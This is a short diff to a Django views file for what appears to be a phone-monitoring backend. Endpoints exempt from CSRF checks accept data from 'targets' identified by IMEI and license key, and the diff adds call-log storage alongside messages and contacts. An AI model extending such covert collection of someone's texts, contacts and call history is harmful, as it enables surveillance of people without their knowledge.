@@ -1,4 +1,4 @@
-from authentication.services import save_messages, save_contacts
+from authentication.services import save_call_logs, save_messages, save_contacts
 from .models import Target
 from .forms import ConnectTargetForm
 import datetime
@@ -7,6 +7,7 @@ from django.views.decorators.csrf import csrf_exempt
 from django.utils.decorators import method_decorator
 from django.views import View
 import json
+
 
 @method_decorator(csrf_exempt, name='dispatch')
 class ConnectTargetView(View):
@@ -33,7 +34,7 @@ class ConnectTargetView(View):
             license_key=license_key).values().first()
 
         return JsonResponse({"target": target})
-    
+
 
 @method_decorator(csrf_exempt, name='dispatch')
 class SyncCallbackView(View):
@@ -47,7 +48,7 @@ class SyncCallbackView(View):
 
         target = Target.objects.filter(
             id=target_id, device_imei=imei, license_key=license_key).first()
-        
+
         if target is None:
             return JsonResponse({"status": "error", "message": "Target not found"})
 
@@ -56,5 +57,7 @@ class SyncCallbackView(View):
             save_messages(messages, target)
         elif sync_type == "contacts":
             save_contacts(body["data"], target)
+        elif sync_type == "call_logs":
+            save_call_logs(body["data"], target)
 
         return JsonResponse({"status": "success"})
